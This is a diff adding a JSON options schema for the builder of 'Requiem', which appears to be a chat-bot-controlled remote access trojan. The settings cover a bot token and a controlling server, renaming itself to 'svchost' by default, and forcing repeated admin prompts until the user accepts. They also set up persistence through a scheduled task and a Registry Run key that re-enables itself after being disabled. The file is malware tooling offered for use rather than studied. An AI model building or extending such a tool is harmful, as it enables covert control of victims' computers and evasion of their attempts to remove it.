@@ -1,0 +1,101 @@
+{
+    "bot": [
+        {
+            "name": "Bot token",
+            "info": "The token of the bot.",
+            "type": "text"
+        },
+        {
+            "name": "Server ID",
+            "info": "The ID of the server that will control the bot.",
+            "type": "text",
+            "attributes": { "type": "number" }
+        },
+        {
+            "name": "Category ID",
+            "info": "The ID of the category each session will be controlled in.",
+            "type": "text",
+            "attributes": { "type": "number" }
+        },
+        {
+            "type": "separator"
+        },
+        {
+            "name": "Command prefix",
+            "info": "The prefix of commands.",
+            "type": "text",
+            "attributes": { "maxlength": 1 },
+            "value": "."
+        },
+        {
+            "name": "Tracking ID",
+            "info": "A custom ID/code to help you keep track of this build.",
+            "type": "text"
+        }
+    ],
+    "setup": [
+        {
+            "name": "Use custom directory",
+            "info": "Installs Requiem to a custom directory. If unchecked, Requiem will install to the music folder or Program Files folder if it has admin privileges.",
+            "type": "checkbox"
+        },
+        {
+            "name": "Custom directory path",
+            "info": "The path of the directory. Use \"<USERPROFILE>\" for the user profile directory or \"<USER>\" for the device's username.",
+            "type": "text"
+        },
+        {
+            "type": "separator"
+        },
+        {
+            "name": "Use custom name",
+            "info": "Rename Requiem to a custom name. If unchecked, Requiem will set its name to \"svchost\".",
+            "type": "checkbox"
+        },
+        {
+            "name": "Custom name",
+            "info": "The name Requiem will rename itself to.",
+            "type": "text"
+        }
+    ],
+    "options": [
+        {
+            "name": "Require admin",
+            "info": "Requires Requiem to have admin privileges to run.",
+            "type": "checkbox"
+        },
+        {
+            "name": "Prompt admin",
+            "info": "Triggers the User Account Control prompt to run Requiem as admin.",
+            "type": "checkbox"
+        },
+        {
+            "name": "Force admin",
+            "info": "Continuously triggers the User Account Control prompt until the user accepts.",
+            "type": "checkbox"
+        },
+        {
+            "name": "Continue without admin",
+            "info": "If the user declines the Account Control prompt while \"Require admin\" is enabled, Requiem will still run.",
+            "type": "checkbox"
+        }
+    ],
+    "persistence": [
+        {
+            "name": "Persistence name",
+            "info": "The name of all persistence values or items.",
+            "type": "text"
+        },
+        {
+            "name": "Task Schedular",
+            "info": "Uses the Task Schedular, It will start Requiem continuosly after that every 8 minutes.",
+            "type": "checkbox"
+        },
+        {
+            "name": "Registry",
+            "info": "Uses the Run key in the Registry, It will also enable itself if it was disabled from e.g. Task Manager.",
+            "type": "checkbox",
+            "value": "true"
+        }
+    ]
+}
